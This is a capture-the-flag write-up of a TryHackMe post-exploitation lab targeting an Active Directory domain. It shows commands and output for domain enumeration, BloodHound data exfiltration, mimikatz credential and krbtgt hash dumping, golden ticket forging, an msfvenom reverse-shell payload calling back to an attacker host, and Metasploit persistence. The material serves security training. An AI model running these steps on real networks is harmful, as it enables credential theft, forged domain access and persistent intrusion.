# Post Exploitation Bascis

[Link to room](https://tryhackme.com/room/postexploit)

	echo machine postexploit.thm >> /etc/hosts
	user:Administrator pass:P@$$W0rd domain:controller.local
	
	Start Powershell - `powershell -ep bypass` the execution policy of powershell allowing you to easily run scripts

### Enumeration w/ Powerview

Run this to start powerview `. .\Downloads\PowerView.ps1 ` 

1. To enumerate domain users `Get-NetUser | select cn`
```
PS C:\Users\Administrator> Get-NetUser | select cn                                                                                                       

cn                  
--                  
Administrator       
Guest               
krbtgt              
Machine-1           
Admin2              
Machine-2           
SQL Service         
POST{redacted}
sshd 
```
To enumerate the domain groups `Get-NetGroup -GroupName *admin*`

```
S C:\Users\Administrator> Get-NetGroup -GroupName *admin*
Administrators 
Hyper-V Administrators 
Storage Replica Administrators
Schema Admins
Enterprise Admins
Domain Admins
Key Admins
Enterprise Key Admins
DnsAdmins
PS C:\Users\Administrator>
```

2. To enumerate shares `invoke-sharefinder`
```
PS C:\Users\Administrator> invoke-sharefinder                                                                                                                
\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin 
\\Domain-Controller.CONTROLLER.local\C$         - Default share       
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC          
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share  
\\Domain-Controller.CONTROLLER.local\<redacted>      -                     
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share  
PS C:\Users\Administrator> 
```

3. To get full information about system `Get-NetComputer -fulldata`
```
PS C:\Users\Administrator> Get-NetComputer -fulldata | select operatingsystem 

operatingsystem                         
---------------                         
Windows Server 2019 Standard Evaluation 
Windows <r> Enterprise Evaluation        
Windows <r> Enterprise Evaluation 
```

### Enumeration w/ bloodhound 

To install bloodhound run `sudo apt-get install bloodhound`
After installing bloodhound run `neo4j console` and goto http://localhost:7474/browser/ to change the default credentials 

Now on the victim machine run `. .\Downloads\SharpHound.ps1`
and run this `Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip` to let bloodhound enumerate 

After that transfer the loot.zip folder to your Attacker Machine by using `scp Administrator@postexploit.thm:C:/Users/Administrator/20200620080225_loot.zip .`

Now open bloodhound `bloodhound` in the terminal and click on the upload data icon on the top-right corner to upload zip file 

1. What service is also a domain admin?

In the Queries tab click on List all domain admins

> S<redacted>service

2. What two users are Kerberoastable?

In the Queries tab click on List all Kerberoastable Accounts

> S<redacted>service, KR<redacted>

### Dumping hashes w/ mimikatz

navigate to Downloads directory and run `mimikatz.exe`

Now run privilege::debug
```
PS C:\Users\Administrator> cd .\Downloads\
PS C:\Users\Administrator\Downloads> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51             
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                              
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                   
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug 
Privilege '20' OK 
```

1. run `lsadump::lsa /patch` and copy machine1 hash to your machine and crack it using hashcat `hashcat -m 1000 hash ../rockyou.txt`

> Pass<redacted>

2. What is the Machine2 Hash?

> <redacted>

### Golden Ticket Attacks w/ mimikatz

run this command in mimikatz.exe `lsadump::lsa /inject /name:krbtgt`
```
mimikatz # lsadump::lsa /inject /name:krbtgt 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 
                                                              
RID  : 000001f6 (502)                                         
User : krbtgt                                                 
                                                              
 * Primary                                                    
    NTLM : 5508500012cc005cf7082a9a89ebdfdf
```

format to create golden ticket `kerberos::golden /user: /domain: /sid: /krbtgt: /id:`

```bash
kerberos::golden /user:krbtgt /domain:CONTROLLER /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:502
```

You will get result like this

```
mimikatz # kerberos::golden /user:krbtgt /domain:CONTROLLER.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:502
02
User      : krbtgt 
Domain    : CONTROLLER.local (CONTROLLER)
SID       : S-1-5-21-849420856-2351964222-986696166
User Id   : 502
Groups Id : *513 512 520 518 519
ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
Lifetime  : 6/20/2020 8:31:41 AM ; 6/18/2030 8:31:41 AM ; 6/18/2030 8:31:41 AM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz #
```
### Enumeration w/ Server Manager

Login to ip using rdesktop `rdesktop -u username -p password -i ip-address`

and open `server manager` in this machine it'll already be opened 

go to `tools` tab in the top-right corner and select Active Directory Users and computers

1. What tool allows to view the event logs?

in the tools you will see the answer 
> Event <redacted>

2. What is the SQL Service password 

In the Description of SQL Service you will see his password
> Mypas<redacted>

### Maintaining Access

create a payload `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=your-ip LPORT=9001 -f exe -o shell.exe`
send it to victim machine using `scp shell.exe Administrator@postexploit.thm:c:/Users/Administrator/`

Now open metasploit and run `use exploit/multi/handler` and set payload , lhost , lport

```
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter_reverse_tcp):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   EXTENSIONS                   no        Comma-separate list of extensions to load
   EXTINIT                      no        Initialization strings for extensions
   LHOST       ip-address       yes       The listen address (an interface may be specified)
   LPORT       9001             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf5 exploit(multi/handler) > 
```

The machine was responding way slowly so i can't show you the next but when you got a meterpreter session press Ctrl+Z at the same time to background the shell and run `use exploit/windows/local/persistence` and set session number to your background session. You can check for background sessions by running `sessions`. after you set the session. `run`. after that even if your connection dies you can instantly get your meterpreter session by using handler and setting the payload.
